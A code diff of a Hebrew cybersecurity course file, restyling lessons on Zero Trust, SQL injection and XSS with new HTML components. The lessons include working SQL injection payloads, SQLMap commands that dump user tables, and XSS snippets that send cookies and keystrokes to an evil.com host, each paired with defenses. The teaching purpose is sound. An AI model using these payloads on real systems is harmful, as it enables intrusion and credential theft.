   <tr><td><code>Assume Breach</code></td><td>תכנן כאילו התוקף כבר בפנים. בידוד, logging, anomaly detection</td></tr>
 </table>
 
-<p><strong>דוגמה מעשית:</strong> עובד רוצה לגשת למסד נתונים פנימי. במודל ישן: הוא ברשת, מותר. ב-Zero Trust: מי אתה? (MFA) מאיזה מכשיר? (device posture) מאיפה? (geolocation) מתי? (שעות עבודה) למה אתה צריך את זה? (least privilege). רק אם הכול מתאים — גישה.</p>
+<div class="info-box"><strong>ℹ️ דוגמה מעשית:</strong> עובד רוצה לגשת למסד נתונים פנימי. במודל ישן: הוא ברשת, מותר. ב-Zero Trust: מי אתה? (MFA) מאיזה מכשיר? (device posture) מאיפה? (geolocation) מתי? (שעות עבודה) למה אתה צריך את זה? (least privilege). רק אם הכול מתאים — גישה.</div>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> Zero Trust הוא לא מוצר שקונים — זו פילוסופיה שמיישמים. Google הטמיעה את זה ב-<code>BeyondCorp</code> ב-2014. היום זה התקן בכל ארגון רציני.</div>
 </div>`
@@ -839,18 +868,19 @@ iptables -L -n -v --line-numbers</code></pre></div>
   <tr><td>VLAN 100</td><td>Servers</td><td>לפי חוקים ספציפיים</td></tr>
 </table>
 
-<p>אם עובד HR נפרץ — התוקף תקוע ב-VLAN 10. הוא לא רואה את שרתי הפיתוח ולא את מסד הנתונים הפיננסי.</p>
+<div class="success-box"><strong>✅ הגנה:</strong> אם עובד HR נפרץ — התוקף תקוע ב-VLAN 10. הוא לא רואה את שרתי הפיתוח ולא את מסד הנתונים הפיננסי.</div>
 
 <p><strong>Microsegmentation — בידוד של כל workload</strong></p>
 <p>הרמה הבאה: כל שרת, כל VM, כל container מבודד בנפרד. גם שני שרתים באותו VLAN לא מדברים ביניהם אלא אם יש חוק מפורש.</p>
 
 <p><strong>כלים:</strong></p>
-<ul>
-<li><code>VMware NSX</code> — microsegmentation ב-data center</li>
-<li><code>Cilium</code> — network policies ב-<code>Kubernetes</code></li>
-<li><code>Cloudflare Access</code> / <code>Zscaler</code> — Zero Trust access ללא VPN</li>
-<li><code>HashiCorp Vault</code> — dynamic secrets, Just-In-Time credentials</li>
-</ul>
+
+<div class="mini-cards">
+  <div class="mini-card"><div class="mini-card-icon">🔷</div><div class="mini-card-title">VMware NSX</div><div class="mini-card-desc">microsegmentation ב-data center</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🐝</div><div class="mini-card-title">Cilium</div><div class="mini-card-desc">network policies ב-Kubernetes</div></div>
+  <div class="mini-card"><div class="mini-card-icon">☁️</div><div class="mini-card-title">Cloudflare / Zscaler</div><div class="mini-card-desc">Zero Trust access ללא VPN</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🔐</div><div class="mini-card-title">HashiCorp Vault</div><div class="mini-card-desc">dynamic secrets, Just-In-Time credentials</div></div>
+</div>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> <code>Defense in Depth</code> — שכבות הגנה: Firewall + DMZ + VLAN + Microsegmentation + Zero Trust + MFA + Logging. תוקף צריך לעבור את כולן. כל שכבה מאטה, כל שכבה מייצרת לוגים, כל שכבה מגדילה את הסיכוי לזיהוי.</div>
 </div>`
@@ -897,15 +927,24 @@ iptables -L -n -v --line-numbers</code></pre></div>
         type: "story",
         title: "Sony PSN — 77 מיליון חשבונות, נשק אחד: SQL Injection",
         content: `<div dir="rtl">
-<p><strong>אפריל 2011. שרתי Sony PlayStation Network נכנסים ל-maintenance. הם לא יחזרו ל-23 יום.</strong></p>
+<div class="scenario-box scenario-hack">
+  <p><strong>תרחיש:</strong> אפריל 2011. שרתי Sony PlayStation Network נכנסים ל-maintenance. הם לא יחזרו ל-23 יום.</p>
+</div>
 
 <p>מה ש-Sony לא אמרה מיד: תוקפים השתמשו ב-<code>SQL Injection</code> — אחת הטכניקות הבסיסיות ביותר — כדי לחדור למסד הנתונים. מה שמצאו שם: 77 מיליון חשבונות משתמשים. שמות, כתובות, מיילים, תאריכי לידה, ו — כן — פרטי כרטיסי אשראי.</p>
+
+<div class="stat-highlight"><span class="stat-number">77M</span><span class="stat-unit">חשבונות משתמשים נחשפו</span></div>
 
 <p>Sony הייתה אחת מחברות הטכנולוגיה הגדולות בעולם. צוותי IT. תקציבי אבטחה. וחולשה בסיסית שסטודנט שנה ב' יכול לנצל הרסה את הכול.</p>
 
 <div class="warning-box"><strong>הנזק:</strong> 23 ימי השבתה מלאה. $171 מיליון עלות ישירה. תביעות ייצוגיות. שם שנפגע לשנים. ה-CEO התנצל בשידור חי בטלוויזיה יפנית.</div>
 
-<p>אבל Sony לא לבד: Heartland Payment Systems (2008, 130 מיליון כרטיסים), TalkTalk (2015, 157,000 לקוחות), Equifax (2017, 147 מיליון). כולם — SQL Injection.</p>
+<div class="incident-timeline">
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">2008</div><div class="timeline-desc"><strong>Heartland Payment Systems</strong> — 130 מיליון כרטיסי אשראי דרך SQLi</div></div>
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">2011</div><div class="timeline-desc"><strong>Sony PSN</strong> — 77 מיליון חשבונות, 23 ימי השבתה</div></div>
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">2015</div><div class="timeline-desc"><strong>TalkTalk</strong> — 157,000 לקוחות, SQLi בסיסי</div></div>
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">2017</div><div class="timeline-desc"><strong>Equifax</strong> — 147 מיליון אמריקאים, מידע פיננסי מלא</div></div>
+</div>
 
 <p>בפרק הזה נצלול לעומק הטכניקות המתקדמות של SQLi ו-XSS, ונלמד איך מגנים נכון.</p>
 </div>`
@@ -916,30 +955,25 @@ iptables -L -n -v --line-numbers</code></pre></div>
         content: `<div dir="rtl">
 <p><strong>מעבר ל-<code>OR 1=1</code> — טכניקות שתוקפים אמיתיים משתמשים בהן</strong></p>
 
-<p><strong>1. UNION-based Extraction — שליפת נתונים ממסד</strong></p>
+<p><strong>1. <span class="phase-badge phase-red">UNION-based</span> Extraction — שליפת נתונים ממסד</strong></p>
+
+<div class="attack-chain">
+  <div class="attack-step"><div class="attack-step-content"><strong>מציאת מספר עמודות</strong><p>ORDER BY 1--, ORDER BY 2--, ORDER BY 3-- (error!) = 2 עמודות</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>זיהוי עמודות מוצגות</strong><p>UNION SELECT 'test1','test2'--</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>שליפת שמות טבלאות</strong><p>UNION SELECT table_name,NULL FROM information_schema.tables--</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>שליפת הנתונים</strong><p>UNION SELECT username,password FROM users--</p></div></div>
+</div>
 
 <div class="code-preview"><pre><code># שלב 1: כמה עמודות יש בשאילתה?
 ' ORDER BY 1-- (ok)
 ' ORDER BY 2-- (ok)
 ' ORDER BY 3-- (error!) --> 2 עמודות
 
-# שלב 2: אילו עמודות מוצגות?
-' UNION SELECT 'test1','test2'--
-
-# שלב 3: שליפת שמות טבלאות
-' UNION SELECT table_name,NULL FROM information_schema.tables--
-# --> users, orders, payments, admin_sessions...
-
-# שלב 4: שליפת עמודות מטבלה
-' UNION SELECT column_name,NULL FROM information_schema.columns
-  WHERE table_name='users'--
-# --> id, username, password, email, credit_card
-
 # שלב 5: שליפת הנתונים עצמם
 ' UNION SELECT username,password FROM users--
 # --> admin:$2b$12$LJ3m... (bcrypt hash)</code></pre></div>
 
-<p><strong>2. Blind Boolean SQLi — שאלות כן/לא</strong></p>
+<p><strong>2. <span class="phase-badge phase-gold">Blind Boolean</span> SQLi — שאלות כן/לא</strong></p>
 
 <div class="code-preview"><pre><code># כשאין output גלוי, שואלים שאלות בינאריות:
 ' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=60--
@@ -951,7 +985,7 @@ iptables -L -n -v --line-numbers</code></pre></div>
   WHERE username='admin')='$'--
 # TRUE! האות הראשונה היא $</code></pre></div>
 
-<p><strong>3. Time-based Blind SQLi — מדידת זמן</strong></p>
+<p><strong>3. <span class="phase-badge phase-blue">Time-based</span> Blind SQLi — מדידת זמן</strong></p>
 
 <div class="code-preview"><pre><code># כשגם אין הבדל בתצוגה:
 ' AND IF((SELECT LENGTH(password) FROM users
@@ -966,9 +1000,10 @@ iptables -L -n -v --line-numbers</code></pre></div>
         type: "demo",
         title: "SQLMap — ניצול אוטומטי של SQL Injection",
         content: `<div dir="rtl">
-<p><strong><code>SQLMap</code> הוא כלי open-source שמזהה ומנצל SQL Injection אוטומטית</strong></p>
-
-<p>מה שלוקח שעה ידנית — SQLMap עושה בדקות:</p>
+<div class="tool-card">
+  <div class="tool-card-icon">🔧</div>
+  <div class="tool-card-body"><strong>SQLMap</strong><p>כלי open-source שמזהה ומנצל SQL Injection אוטומטית. מה שלוקח שעה ידנית — SQLMap עושה בדקות.</p></div>
+</div>
 
 <div class="code-preview"><pre><code># סריקה בסיסית — בדיקה אם הפרמטר פגיע
 sqlmap -u "http://target.com/search?q=test" --batch
@@ -986,21 +1021,22 @@ sqlmap -u "http://target.com/search?q=test" -D webapp_db --tables
 # --> users, products, orders, sessions
 
 # שליפת טבלת users
-sqlmap -u "http://target.com/search?q=test" -D webapp_db \
+sqlmap -u "http://target.com/search?q=test" -D webapp_db \\
   -T users --dump
 # --> id | username | password_hash | email | ...
 
 # פיצוח hash-ים (אם חלשים)
-sqlmap -u "http://target.com/search?q=test" -D webapp_db \
+sqlmap -u "http://target.com/search?q=test" -D webapp_db \\
   -T users --dump --passwords</code></pre></div>
 
 <p><strong>יכולות מתקדמות:</strong></p>
-<ul>
-<li><code>--os-shell</code> — מקבל shell על השרת (אם יש הרשאות)</li>
-<li><code>--tamper</code> — עוקף WAF עם טכניקות encoding</li>
-<li><code>--level 5 --risk 3</code> — בדיקות אגרסיביות יותר</li>
-<li><code>--forms</code> — סורק טפסים אוטומטית</li>
-</ul>
+
+<div class="mini-cards">
+  <div class="mini-card"><div class="mini-card-icon">💻</div><div class="mini-card-title">--os-shell</div><div class="mini-card-desc">מקבל shell על השרת (אם יש הרשאות)</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🛡️</div><div class="mini-card-title">--tamper</div><div class="mini-card-desc">עוקף WAF עם טכניקות encoding</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🔥</div><div class="mini-card-title">--level 5 --risk 3</div><div class="mini-card-desc">בדיקות אגרסיביות יותר</div></div>
+  <div class="mini-card"><div class="mini-card-icon">📝</div><div class="mini-card-title">--forms</div><div class="mini-card-desc">סורק טפסים אוטומטית</div></div>
+</div>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> אם SQLMap מוצא את החולשה — תוקף אמיתי בטוח יכול גם. הכלי הזה מדגים למה <code>Prepared Statements</code> הם לא אופציונליים — הם חובה מוחלטת.</div>
 </div>`
@@ -1011,24 +1047,31 @@ sqlmap -u "http://target.com/search?q=test" -D webapp_db \
         content: `<div dir="rtl">
 <p><strong>Prepared Statements הם ההגנה מספר 1 — אבל לא היחידה</strong></p>
 
-<p><strong>שכבה 1: Prepared Statements (Parameterized Queries)</strong></p>
+<p><strong>שכבה 1: <span class="phase-badge phase-green">Prepared Statements</span> (Parameterized Queries)</strong></p>
 <p>השאילתה מקומפלת לפני הכנסת הנתונים. הנתונים מטופלים כ-data, לא כ-code — ולכן לא יכולים לשנות את מבנה השאילתה.</p>
 
-<table class="content-table">
-  <tr><th>שפה</th><th>קוד פגיע</th><th>קוד בטוח</th></tr>
-  <tr><td>Python</td><td><code>f"SELECT * FROM u WHERE name='{inp}'"</code></td><td><code>"SELECT * FROM u WHERE name=?", (inp,)</code></td></tr>
-  <tr><td>Java</td><td><code>"SELECT ... '" + input + "'"</code></td><td><code>PreparedStatement + setString()</code></td></tr>
-  <tr><td>PHP</td><td><code>"SELECT ... '$_POST[x]'"</code></td><td><code>PDO prepare() + bindParam()</code></td></tr>
-  <tr><td>Node.js</td><td><code>"SELECT ... " + req.body.x</code></td><td><code>connection.query("?", [val])</code></td></tr>
-</table>
+<div class="vs-container">
+  <div class="vs-card vs-bad"><h4>❌ קוד פגיע</h4>
+    <p><strong>Python:</strong> <code>f"SELECT * FROM u WHERE name='{inp}'"</code></p>
+    <p><strong>Java:</strong> <code>"SELECT ... '" + input + "'"</code></p>
+    <p><strong>PHP:</strong> <code>"SELECT ... '$_POST[x]'"</code></p>
+    <p><strong>Node.js:</strong> <code>"SELECT ... " + req.body.x</code></p>
+  </div>
+  <div class="vs-card vs-good"><h4>✅ קוד בטוח</h4>
+    <p><strong>Python:</strong> <code>"SELECT * FROM u WHERE name=?", (inp,)</code></p>
+    <p><strong>Java:</strong> <code>PreparedStatement + setString()</code></p>
+    <p><strong>PHP:</strong> <code>PDO prepare() + bindParam()</code></p>
+    <p><strong>Node.js:</strong> <code>connection.query("?", [val])</code></p>
+  </div>
+</div>
 
-<p><strong>שכבה 2: Input Validation</strong></p>
+<p><strong>שכבה 2: <span class="phase-badge phase-blue">Input Validation</span></strong></p>
 <p>אם שדה אמור להכיל מספר — וודאו שזה מספר. אם מייל — בדקו פורמט. <code>Whitelist validation</code> (מה מותר) עדיף על <code>Blacklist</code> (מה אסור).</p>
 
-<p><strong>שכבה 3: WAF (Web Application Firewall)</strong></p>
+<p><strong>שכבה 3: <span class="phase-badge phase-gold">WAF</span> (Web Application Firewall)</strong></p>
 <p>שכבה נוספת שמזהה patterns של SQLi בבקשות HTTP. לא תחליף ל-Prepared Statements — אבל תתפוס מה שנשמט.</p>
 
-<p><strong>שכבה 4: Least Privilege ב-DB</strong></p>
+<p><strong>שכבה 4: <span class="phase-badge phase-green">Least Privilege ב-DB</span></strong></p>
 <p>אפליקציית Web לא צריכה <code>DROP TABLE</code> או <code>FILE</code> privileges. משתמש DB ייעודי עם הרשאות מינימליות מצמצם נזק גם אם יש פריצה.</p>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> אין פתרון אחד שמספיק. הגנה אמיתית = Prepared Statements + Input Validation + WAF + Least Privilege + Monitoring. כל שכבה שנפרצת — הבאה עוצרת.</div>
@@ -1040,8 +1083,9 @@ sqlmap -u "http://target.com/search?q=test" -D webapp_db \
         content: `<div dir="rtl">
 <p><strong>מעבר ל-<code>alert(1)</code> — טכניקות XSS מתקדמות</strong></p>
 
-<p><strong>DOM-based XSS — הכול קורה בדפדפן</strong></p>
-<p>בניגוד ל-Reflected/Stored, ב-DOM-based XSS ה-payload לא עובר דרך השרת בכלל:</p>
+<p><strong><span class="phase-badge phase-red">DOM-based XSS</span> — הכול קורה בדפדפן</strong></p>
+
+<div class="info-box"><strong>ℹ️ מידע:</strong> בניגוד ל-Reflected/Stored, ב-DOM-based XSS ה-payload לא עובר דרך השרת בכלל.</div>
 
 <div class="code-preview"><pre><code>// קוד JS פגיע באתר:
 var search = document.location.hash.substring(1);
@@ -1051,7 +1095,7 @@ document.getElementById("output").innerHTML = search;
 // https://site.com/page#&lt;img src=x onerror="fetch('https://evil.com/?c='+document.cookie)"&gt;
 // הדפדפן מבצע את הקוד — השרת אף פעם לא ראה את ה-payload!</code></pre></div>
 
-<p><strong>Cookie Theft בפעולה:</strong></p>
+<p><strong><span class="phase-badge phase-red">Cookie Theft</span> בפעולה:</strong></p>
 
 <div class="code-preview"><pre><code>// Stored XSS בשדה תגובה באתר:
 &lt;script&gt;
@@ -1070,7 +1114,7 @@ document.onkeypress = function(e) {
 }
 &lt;/script&gt;</code></pre></div>
 
-<p><strong>CSP Bypass Techniques (לידע הגנתי):</strong></p>
+<p><strong><span class="phase-badge phase-gold">CSP Bypass</span> Techniques (לידע הגנתי):</strong></p>
 
 <div class="code-preview"><pre><code>// אם CSP מאפשר 'unsafe-eval':
 &lt;script&gt;eval("ale"+"rt(1)")&lt;/script&gt;
@@ -1091,18 +1135,18 @@ document.onkeypress = function(e) {
         content: `<div dir="rtl">
 <p><strong>שלוש שכבות הגנה שביחד עוצרות כמעט כל XSS</strong></p>
 
-<p><strong>שכבה 1: Output Encoding — מנטרל את ה-payload</strong></p>
+<p><strong>שכבה 1: <span class="phase-badge phase-green">Output Encoding</span> — מנטרל את ה-payload</strong></p>
 <p>כל output שמגיע ממשתמש חייב encoding. במקום <code>&lt;script&gt;</code> יוצג <code>&amp;lt;script&amp;gt;</code> — טקסט רגיל שלא מתבצע.</p>
 
 <table class="content-table">
   <tr><th>Framework</th><th>ברירת מחדל</th><th>מצב מסוכן</th></tr>
-  <tr><td>React</td><td>auto-escape (בטוח!)</td><td><code>dangerouslySetInnerHTML</code></td></tr>
-  <tr><td>Jinja2 (Python)</td><td>auto-escape (בטוח!)</td><td>פילטר <code>| safe</code></td></tr>
-  <tr><td>Angular</td><td>auto-sanitize (בטוח!)</td><td><code>bypassSecurityTrust*</code></td></tr>
-  <tr><td>PHP</td><td>לא מגן!</td><td>חובה <code>htmlspecialchars()</code></td></tr>
+  <tr><td>React</td><td><span class="phase-badge phase-green">auto-escape</span></td><td><code>dangerouslySetInnerHTML</code></td></tr>
+  <tr><td>Jinja2 (Python)</td><td><span class="phase-badge phase-green">auto-escape</span></td><td>פילטר <code>| safe</code></td></tr>
+  <tr><td>Angular</td><td><span class="phase-badge phase-green">auto-sanitize</span></td><td><code>bypassSecurityTrust*</code></td></tr>
+  <tr><td>PHP</td><td><span class="phase-badge phase-red">לא מגן!</span></td><td>חובה <code>htmlspecialchars()</code></td></tr>
 </table>
 
-<p><strong>שכבה 2: Content Security Policy (CSP)</strong></p>
+<p><strong>שכבה 2: <span class="phase-badge phase-blue">Content Security Policy (CSP)</span></strong></p>
 <p>Header שאומר לדפדפן: "הרץ JavaScript רק ממקורות שאני מאשר."</p>
 
 <div class="code-preview"><pre><code># CSP חזק:
@@ -1117,7 +1161,7 @@ Content-Security-Policy:
 &lt;script nonce="a1b2c3d4"&gt;console.log("allowed")&lt;/script&gt;
 &lt;script&gt;alert("blocked by CSP!")&lt;/script&gt;</code></pre></div>
 
-<p><strong>שכבה 3: HttpOnly + Secure + SameSite Cookies</strong></p>
+<p><strong>שכבה 3: <span class="phase-badge phase-green">HttpOnly + Secure + SameSite</span> Cookies</strong></p>
 
 <div class="code-preview"><pre><code># Cookie שמוגן מ-XSS:
 Set-Cookie: session=abc123;
@@ -1126,6 +1170,13 @@ Set-Cookie: session=abc123;
   SameSite=Strict;  # לא נשלח ב-cross-site requests</code></pre></div>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> <code>HttpOnly</code> לא מונע XSS — הוא מונע את הנזק הנפוץ ביותר (גניבת cookies). תוקף עם XSS עדיין יכול לשנות את הדף, להוסיף טפסים מזויפים, או להקליט הקשות. לכן כל השכבות ביחד חשובות.</div>
+
+<div class="chapter-summary"><h4>סיכום הפרק</h4><ul>
+<li>SQL Injection מנוצל דרך UNION, Blind Boolean, ו-Time-based — כולם נעצרים ע"י Prepared Statements</li>
+<li>XSS מגיע ב-3 וריאנטים: Reflected, Stored, DOM-based — ההגנה: Output Encoding + CSP + HttpOnly</li>
+<li>הגנה בשכבות (Defense in Depth) היא הגישה הנכונה — אין פתרון קסם אחד</li>
+<li>תרגול על DVWA ו-PortSwigger Academy — הדרך הטובה ביותר ללמוד</li>
+</ul></div>
 </div>`
       },
       {
